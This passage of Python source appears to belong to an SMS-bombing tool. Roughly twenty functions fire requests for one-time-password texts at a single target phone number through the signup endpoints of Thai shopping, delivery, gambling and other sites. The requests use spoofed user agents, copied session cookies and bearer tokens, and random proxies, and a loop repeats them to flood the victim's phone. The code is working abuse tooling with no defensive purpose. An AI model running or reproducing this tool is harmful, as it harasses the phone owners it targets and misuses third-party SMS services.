      "referer=https%3A%2F%2Fwww.konvy.com%2Fm%2F;PHPSESSID=vnqlo8v638jofnb15arplijj3i;k_privacy_state=true;referer=https%3A%2F%2Fwww.konvy.com%2Fm%2Flogin.php;_gcl_au=1.1.531291202.1661272286;_fbp=fb.1.1661272286002.265391910;_gid=GA1.2.960487052.1661272286;_gat_UA-28072727-2=1;_tt_enable_cookie=1;_ttp=d640ab77-0c19-4578-855d-4fb1ceda3f0a;f34c_new_user_view_count=%7B%22count%22%3A2%2C%22expire_time%22%3A1661358684%7D;_ga_Z9S47GV47R=GS1.1.1661272286.1.1.1661272293.53.0.0;_ga=GA1.2.1347355119.1661272286"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API19 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API19 | {r.status_code}"
    )
    
def api20(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post("https://api.1112delivery.com/api/v1/otp/create",
                    headers={
                      "content-type": "application/json;charset=UTF-8",
                      "user-agent": generate_user_agent(),
                      "accept": "application/json, text/plain, */*"
                    },
                    json={
                      "phonenumber": phone,
                      "language": "th"
                    },
                    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API20 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API20 | {r.status_code}"
    )
    
def api21(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.get(
    f"https://app.iship.cloud/api/ant/request-otp/{phone}",
    headers={
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
      "cookie":
      "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D; _gcl_au=1.1.1744992984.1664699333; _ga_5H8RG35JM3=GS1.1.1664699330.1.1.1664699332.0.0.0; _gid=GA1.2.1851918371.1664699333; _gat_UA-208577766-1=1; _ga=GA1.1.1543229521.1664699330; _ga_9QF6J7SNMX=GS1.1.1664699332.1.0.1664699332.0.0.0"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API21 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API21 | {r.status_code}"
    )
    
def api22(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://www.ctrueshop.com/member.php?page=25&type=9",
    headers={
      "accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "content-type":
      "application/x-www-form-urlencoded",
      "cookie":
      "PHPSESSID=1po9v1nrrem5fr8co6urk37lv1; _gcl_au=1.1.867007754.1665302231; _ga=GA1.2.1978432786.1665302231; _gid=GA1.2.1842911343.1665302231; _gat_gtag_UA_19183081_1=1; __sdwc=0978bae8-1717-4f1b-9f1a-dcf9dce81fa8; rchatbox:checkCrossOriginWebdata=1665302236917",
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
    },
    data=f"tel1={phone}&affiliate=2&social=",
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API22 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API22 | {r.status_code}"
    )
    
def api23(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.bigthailand.com/authentication-service/user/OTP", json={"locale":"th","phone": f"+66{phone[1:]}","email":"dkdk@gmail.com","userParams":{"buyerName":"ekek ks","activateLink":"www.google.com"}},headers={"content-type": "application/json","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg","cookie": "auth.strategy=local;auth._token.local=Bearer%20eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..P9LOZOUnXvgw5wDxPqSuCg.jjRU6v4iidkFNv4nROigeng1s9e96LnzplOaml7YSasaTxwozO37IWuq-h6bV5JyxpaRvIL9UCochw-3OciWq_VrORNwnH45b-ziIAhZ-CpLpt1O_4EpM27y7TYXBb_w6DT3BJp1ARkG7CqSouTnGg.2n1G9HbFJzArFH5Rr2m9kg;_utm_objs=eyJzb3VyY2UiOiJnb29nbGUiLCJtZWRpdW0iOiJjcGMiLCJjYW1wYWlnbiI6ImFkd29yZHMiLCJj%0D%0Ab250ZW50IjoiYWR3b3JkcyIsInRlcm0iOiJhZHdvcmRzIiwidHlwZSI6InJlZmVycmVyIiwidGlt%0D%0AZSI6MTY0MjMyOTM5OTU4NSwiY2hlY2tzdW0iOiJaMjl2WjJ4bExXTndZeTFoWkhkdmNtUnpMVEUy%0D%0ATkRJek1qa3pPVGsxT0RVPSJ9;_pk_ref.564990563.2c0e=%5B%22%22%2C%22%22%2C1642329400%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D;_pk_ses.564990563.2c0e=*;_gcl_au=1.1.833577636.1642329400;_asm_visitor_type=n;_ac_au_gt=1642329406505;cdp_session=1;_asm_uid=637506384;_ga=GA1.2.1026893832.1642329403;_gid=GA1.2.1437369318.1642329403;OptanonConsent=isIABGlobal=false&datestamp=Sun+Jan+16+2022+17%3A36%3A45+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.9.0&hosts=&consentId=e0fe7ec6-3c1e-4aa7-9e72-ecd2ed724416&interactionCount=0&landingPath=https%3A%2F%2Fwww.bigthailand.com%2Fcategory%2F850%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2581%25E0%25B8%25A5%25E0%25B8%25B0%25E0%25B8%2582%25E0%25B8%25AD%25E0%25B8%2587%25E0%25B9%2580%25E0%25B8%25AB%25E0%25B8%25A5%25E0%25B8%25A7%2F%25E0%25B8%2599%25E0%25B9%2589%25E0%25B8%25B3%25E0%25B8%25A1%25E0%25B8%25B1%25E0%25B8%2599%25E0%25B9%2580%25E0%25B8%2584%25E0%25B8%25A3%25E0%25B8%25B7%25E0%25B9%2588%25E0%25B8%25AD%25E0%25B8%2587%3Fgclid%3DCj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB&groups=C0001%3A1%2CC0003%3A1%2CC0002%3A1%2CC0007%3A1;_fbp=fb.1.1642329406623.363807498;_hjSessionUser_2738378=eyJpZCI6ImVkNmZhOGY3LTQwNDctNTNjMi04YTVjLTQ0OGE5MDA4YjhiZCIsImNyZWF0ZWQiOjE2NDIzMjk0MDQ4MDMsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample=0;_hjSession_2738378=eyJpZCI6ImNhN2UwZDFhLTZkNmQtNGM0Mi04YmI1LTg4NWJmNzZjMGExZCIsImNyZWF0ZWQiOjE2NDIzMjk0MTEwNzcsImluU2FtcGxlIjpmYWxzZX0=;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_gac_UA-165856282-1=1.1642329477.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_gcl_aw=GCL.1642329478.Cj0KCQiAoY-PBhCNARIsABcz772kcpD38d5bhec3kfJbZgVxKFVwa2RmZytANH-PiwJdPXbqc7VOzCEaAuBkEALw_wcB;_pk_id.564990563.2c0e=0.1642329400.1.1642329489.1642329400.;_ac_client_id=637515726.1642329496;_ac_an_session=zmzlzhzlzizqzmzjzkzjzdzlzgzkzmzizmzkzhzlzdzizlznzhzgzhzqznzqzlzdzizdzizlznzhzgzhzqznzqzlzdzizlznzhzgzhzqznzqzlzdzizdzgzjzizdzjzd2h25zdzgzdzezizd;au_id=637515726;_ga_80VN88PBVD=GS1.1.1642329399.1.1.1642329493.44"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API23 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API23 | {r.status_code}")
		
def api24(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	head = {
	    "Host": "shopgenix.com",
	    "content-length": "37",
	    "sec-ch-ua-mobile": "?1",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
	    "x-requested-with": "XMLHttpRequest",
	    "sec-ch-ua-platform": "Android",
	    "accept": "application/json, text/javascript, */*; q=0.01",
	    "origin": "https://shopgenix.com",
	    "referer": "https://shopgenix.com/app/5364874/",
	    "sec-fetch-site": "same-origin",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-dest": "empty"
	    }
	r = requests.post("https://shopgenix.com/api/sms/otp/",headers=head,data=f"mobile_country_id=1&mobile={phone}",proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API24 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API24 | {r.status_code}")
		
def api25(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",json={"ConsentFlag":"true","AcceptPolicy":"true","Tel":phone,"OTPId":"","OTP1":"","OTP2":"","OTP3":"","OTP4":"","OTP5":"","OTP6":"","Email":"","Pin1":"","Pin2":"","Pin3":"","Pin4":"","Pin5":"","Pin6":"","PinConfirm1":"","PinConfirm2":"","PinConfirm3":"","PinConfirm4":"","PinConfirm5":"","PinConfirm6":"","FirstName":"","LastName":""},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API25 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API25 | {r.status_code}")
		
def api26(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	head = {
	    "Host": "id.zilingo.com",
	    "content-length": "153",
	    "accept": "application/json, text/plain, */*",
	    "content-type": "application/json",
	    "x-requested-with": "XMLHttpRequest",
	    "sec-ch-ua-mobile": "?1",
	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "sec-ch-ua-platform": "Android",
	    "origin": "https://id.zilingo.com",
	    "sec-fetch-site": "same-origin",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-dest": "empty",
	    "referer": "https://id.zilingo.com/login?redirectTo=%2Fth-th%2FWomen%2FClothing&zl_a_si=WCL&up_s=B2B_ASIA_MALL&zl_a_st=category&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ%3D%3D&zl_a_pid=SCR-1644292893237-8b21bb69-4f78-4c0d-b828-9f8ff6950507&redirectTo=%2Fth-th%2FWomen%2FClothing&redirectTo=%2Fth-th%2FWomen%2FClothing",
	    "cookie": "_ga=GA1.2.2069144459.1644337535;G_ENABLED_IDPS=google;PLAY_LANG=th;_gid=GA1.2.1262789134.1645627170;_gat_UA-73457576-9=1"
	    }
	r = requests.post("https://id.zilingo.com/api/v1/userVerification/initiate?up_s=B2B_ASIA_MALL&up_cd=v1_eyJjbGllbnRVc2VySWRlbnRpZmljYXRpb24iOnsiYW5vbnltb3VzVXNlcklkT3B0IjoiQUlENTUwMDY3MTIzMjA0NTY2MDkyIiwic2Vzc2lvbklkT3B0IjoiU0lENTUwMDY3MTIzMjA0NTY2MDkyIiwidXNlcklkT3B0IjpudWxsfSwic2NyZWVuT3B0Ijp7InNjcmVlblR5cGUiOiJDQVRFR09SWSIsInNjcmVlbklkIjoiV0NMIiwic2NvcGUiOm51bGx9LCJidXllclJlZ2lvbk9wdCI6IkIyQl9USEEiLCJsb2NhbGVDb2RlIjoidGgiLCJxdiI6eyJjbGllbnQiOiJXZWIiLCJzdWJDbGllbnQiOiJEZXNrdG9wV2ViIiwidmVyc2lvbiI6IjM1LjguNSJ9fQ==",headers=head,json={"channelDetails":{"phoneNumber":f"+66{phone[1:]}","channelType":"SMS"},"source":"UNIFIED_LOGIN","action":"OTP_LOGIN","redirectTo":"/th-th/Women/Clothing"},proxies={'http': 'http://' + random.choice(s)}).text
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API26 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API26 | {r.status_code}")
		
def api27(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.easymoney.co.th/estimate/actionSendOtp",data=f"gg_token&name=cybersafe&surname=cybersafe&email=rjrockyou@gmail.com&phone={phone}&area_id=2&password=Hack80&password_chk=Hack80&code=&condition=1",headers={"accept":"application/json, text/javascript, */*; q=0.01","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36","cookie":"PHPSESSID=1933025720c12fcbb618a207ad775e54;_gcl_au=1.1.506859633.1650848781;_fbp=fb.2.1650848782133.743024538;_ga=GA1.3.1379383593.1650848782;pdpa=1;_gid=GA1.3.380431543.1651807350;_gat_UA-182229042-1=1"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API27 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API27 | {r.status_code}")

def api28(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API28 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API28 | {r.status_code}")
		
def api29(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phone},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API29 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API29 | {r.status_code}")
		
def api30(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.put(
    f"https://www.xn--24-3qi4duc3a1a7o.net/api/common/otp/request/{phone}",
    headers={
      "content-type":
      "application/json;charset=UTF-8",
      "accept":
      "application/json, text/plain, */*",
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
    },
    json={"method": "register"},
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API30 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False  API30 | {r.status_code}"
    )
    
def api31(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  SEND = Session()
  API_WEB = SEND.get('https://www.bigthailand.com/login',
                     headers={
                       "user-agent": generate_user_agent()
                     }).text
  SEND_TOKEN = bs(API_WEB, 'html.parser')
  TOKEN = SEND_TOKEN.find("input", attrs={"name": "auth._token.local"})
  r = SEND.post(
    "https://www.bigthailand.com/authentication-service/user/OTP",
    headers={
      "user-agent":
      generate_user_agent(),
      "authorization":
      f"Bearer {TOKEN}['value']",
      "content-type":
      "application/json;charset=UTF-8",
      "cookie":
      f"""auth.strategy=local; auth._token.local=Bearer%20{TOKEN}['value]; _pk_ref.564990563.2c0e=%5B%22google%22%2C%22%22%2C1664004463%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D; _pk_ses.564990563.2c0e=*; _gcl_au=1.1.1986299425.1664004463; _cdp_cfg=1; _asm_visitor_type=n; _ac_au_gt=1664004464356; _gid=GA1.2.681823710.1664004464; _gat_UA-165856282-1=1; popupTimeStamp=%7B%22popupIdx%22%3A0%2C%22expiredAt%22%3A%222022-09-24T07%3A57%3A43.685Z%22%7D; _asm_uid=890390276; cdp_session=1; _fbp=fb.1.1664004464406.202179650; _ga=GA1.2.2004890464.1664004464; _gac_UA-165856282-1=1.1664004466.Cj0KCQjw1bqZBhDXARIsANTjCPJYsw6vOZXFPznA9K3T9a7DJPSigqMeogNJR_toRTt9mJVPQifKu9IaAuM3EALw_wcB; isiframeenabled=true; _tt_enable_cookie=1; _ttp=fb53a55e-7e89-482c-8dcc-7d65cc3a9d43; _gcl_aw=GCL.1664004467.Cj0KCQjw1bqZBhDXARIsANTjCPJYsw6vOZXFPznA9K3T9a7DJPSigqMeogNJR_toRTt9mJVPQifKu9IaAuM3EALw_wcB; bigthailand-_zldp=OM%2F3Rx7iTnXlJ%2BG06WL7xCVOFTKwr0NmKdBzRqdYXCGLMGKJRuNpNfzZ9I3mvVMsodoRkLyJC2Y%3D; bigthailand-_zldt=93ed1974-6077-46c9-80b4-5d8af7b21d11-2; _ga_80VN88PBVD=GS1.1.1664004463.1.1.1664004470.53.0.0; _pk_id.564990563.2c0e=0.1664004463.1.1664004484.1664004463.; _ac_client_id=890389481.1664004485; _ac_an_session=zmzmzmzjzmzgzmzmzizjzdzrzqzjzgzrzqznzrzizdzizlzlznzjzjznznzrzmzdzizdzizlzlznzjzjznznzrzmzdzizlzlznzjzjznznzrzmzdzizdzgzjzizdzjzd2h25zdzgzdznzkzmzqzrzd; au_id=890389481; OptanonAlertBoxClosed=2022-09-24T07:28:08.466Z; OptanonConsent=isGpcEnabled=0&datestamp=Sat+Sep+24+2022+14%3A28%3A08+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.33.0&isIABGlobal=false&hosts=&consentId=47109f59-44b2-40f3-b0c9-4e0b0c8cd8a9&interactionCount=1&landingPath=NotLandingPage&groups=C0001%3A1%2CC0003%3A1%2CC0004%3A1%2CC0002%3A1%2CC0007%3A1"""
    },
    json={
      "locale": "th",
      "phone": f"+66{phone[1:]}",
      "email": "asjfgyfg2@hbsfsdf.sdf",
      "userParams": {
        "buyerName": "sfiushjud fusdhfus",
        "activateLink": "www.google.com"
      }
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API31 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API31 | {r.status_code}"
    )
    
def api32(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = post(
    "https://www.vegas77slots.com/auth/send_otp",
    data=
    f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",
    headers={
      "content-type": "application/x-www-form-urlencoded",
      "user-agent":
      "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
      "cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"
    })
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API32 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API32 | {r.status_code}"
    )

def api33(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://www.msport1688.com/auth/otp_sender",
    headers={
      "content-type":
      "application/x-www-form-urlencoded",
      "cookie":
      "msp_ss_client=nin5curi8elq4364dlslffs5ennnv8oo; _ga=GA1.1.867791689.1664019874; _ga_1YLLB0C2FF=GS1.1.1664019873.1.1.1664019875.0.0.0",
      "user-agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
    },
    data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=",
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API33 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API33 | {r.status_code}"
    )

def api34(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":"{phone}","country":"66"},"type":"mobile"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API34 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API34 | {r.status_code}")
		
def api35(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"}, json={"reqId":"39816-1633012470","params":{"phone": f"+66{phone[1:]}","language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API35 | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API35 | {r.status_code}")
		
def api36(phone):
  da = datetime.datetime.now()
  ok = da.strftime("%H:%M:%S")
  r = requests.post(
    "https://graph.firster.com/graphql",
    headers={
      "user-agent":
      "Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json"
    },
    json={
      "operationName":
      "sendOtp",
      "variables": {
        "input": {
          "mobileNumber": f"{phone[1:]}",
          "phoneCode": "THA-66"
        }
      },
      "query":
      "mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"
    },
    proxies={'http': 'http://' + random.choice(s)})
  if r.status_code == 200 or r.status_code == 201:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success API36 | {r.status_code}"
    )
  else:
    print(
      f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False   API36 | {r.status_code}"
    )



def apicall(phone):
	da = datetime.datetime.now()
	ok = da.strftime("%H:%M:%S")
	r = requests.post("https://1ufa.bet/_ajax_/request-otp", data={"request_otp[phoneNumber]": f"{phone}", "request_otp[termAndCondition]": "1", "request_otp[_token]": "U5doBrJJ5u91294kDU40Z_KrdPLTcfNQ5J3MhDsyg8M"}, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36","Content-Type": "application/x-www-form-urlencoded","cookie": "_gid=GA1.2.1736081460.1679951032; PHPSESSID=0j2uoh0oesv4ngaopas52ug8gk; _raw_ref=https%3A%2F%2F1ufa.bet%2F; _ga=GA1.2.1166363420.1679951032; _ga_5148MHRV47=GS1.1.1679951031.1.1.1679952029.0.0.0"},proxies={'http': 'http://' + random.choice(s)})
	if r.status_code == 200 or r.status_code == 201:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[32mRequest Success Call | {r.status_code}")
	else:
		print(f"\x1b[31m[\x1b[00m{ok}\x1b[31m] \x1b[00m: \x1b[31mRequest False Call | {r.status_code}")

def SMS(phone, jam):
	for _ in range(jam+1):
